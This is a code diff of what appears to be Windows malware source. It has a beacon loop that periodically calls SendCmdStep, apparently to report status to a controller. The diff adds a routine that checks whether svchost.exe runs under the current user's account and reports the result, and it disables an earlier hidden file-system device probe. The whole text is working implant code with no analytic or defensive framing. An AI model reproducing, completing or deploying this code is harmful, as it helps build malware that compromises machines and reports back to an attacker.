@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <wininet.h>
 #include <stdlib.h>
+#include <tlhelp32.h>
 
 #pragma comment(linker, "/ENTRY:MyMain" )
 
@@ -100,10 +101,9 @@ DWORD WINAPI PingerProc(LPVOID)
 {
 	while( true )
 	{
-		OutputDebugString("1");
 		SendCmdStep(165);
-//		Sleep(1000 * 60 * 30);
-		Sleep(1000 * 30);
+		Sleep(1000 * 60 * 30);
+//		Sleep(1000 * 30);
 	}
 /*
 	GetTempPathA(MAX_PATH, tempFolder);
@@ -131,6 +131,58 @@ void WriteAllBytes( const char* nameFile, char* data, int sz )
  CloseHandle(file);
 }
 
+bool ExistsSvchostAdmin()
+{
+	HANDLE snap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
+	PROCESSENTRY32 pe;
+	pe.dwSize = sizeof(pe);
+	Process32First( snap, &pe );
+	bool ret = false;
+
+	do
+	{
+		if( lstrcmp( pe.szExeFile, "svchost.exe" ) == 0 )
+		{
+			HANDLE hproc = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID );
+			if( hproc )
+			{
+				HANDLE htoken = 0;
+				if( OpenProcessToken( hproc, TOKEN_QUERY, &htoken ) )
+				{
+					DWORD cbti = 0;
+					GetTokenInformation( htoken, TokenUser, NULL, 0, &cbti );
+					if( GetLastError() == ERROR_INSUFFICIENT_BUFFER )
+					{
+						PTOKEN_USER ptiUser = (PTOKEN_USER)LocalAlloc( LPTR, cbti );
+						if( GetTokenInformation( htoken, TokenUser, ptiUser, cbti, &cbti ) ) 
+						{
+							SID_NAME_USE snu;
+							char nameUser[128], domain[128];
+							DWORD lenNameUser = sizeof(nameUser);
+							DWORD lenDomain = sizeof(domain);
+							if( LookupAccountSid( NULL, ptiUser->User.Sid, nameUser, &lenNameUser, domain, &lenDomain, &snu ) )
+							{
+								char currUser[128];
+								DWORD lenCurrUser = sizeof(currUser);
+								GetUserName( currUser, &lenCurrUser );
+								if( lstrcmp( currUser, nameUser ) == 0 )
+								{
+									ret= true;
+								}
+							}
+							LocalFree(ptiUser);
+						}
+					}
+					CloseHandle(htoken);
+				}
+				CloseHandle(hproc);
+			}
+		}
+	} while( !ret && Process32Next( snap, &pe ) );
+	CloseHandle(snap);
+	return ret;
+}
+
 #ifdef RELEASEDLL
 // Работаем в библиотеке
 BOOL APIENTRY MyMain( HMODULE hModule,
@@ -149,6 +201,7 @@ BOOL APIENTRY MyMain( HMODULE hModule,
 	int APIENTRY MyMain() 
 	{
 		Sleep(60 * 1000);
+		/*
 		SendCmdStep(161);
 		BOOL FsPresent = FALSE;
 		if (CreateFsDeviceName())
@@ -169,6 +222,9 @@ BOOL APIENTRY MyMain( HMODULE hModule,
 			else
 				SendCmdStep(164);
 		}
+		*/
+		if( ExistsSvchostAdmin() )
+			SendCmdStep(170);
 		return PingerProc(NULL);
 	}
 
